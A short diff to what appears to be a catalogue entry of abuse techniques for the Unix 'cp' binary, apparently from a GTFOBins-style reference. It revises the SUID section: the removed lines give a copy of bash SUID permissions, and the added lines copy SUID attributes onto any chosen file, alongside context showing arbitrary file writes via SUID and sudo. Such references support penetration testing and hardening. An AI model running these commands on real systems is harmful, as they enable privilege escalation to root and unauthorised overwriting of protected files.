@@ -18,10 +18,10 @@ functions:
         TF=$(mktemp)
         echo "DATA" > $TF
         ./cp $TF $LFILE
-    - description: This can copy cp attributes and permissions to create a new file with SUID privileges like bash
+    - description: This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.
       code: |
-        cp /bin/bash /tmp/bash
-        cp --attributes-only --preserve=all `which cp` /tmp/bash
+        LFILE=file_to_change
+        ./cp --attributes-only --preserve=all ./cp "$LFILE"
   sudo:
     - code: |
         LFILE=file_to_write
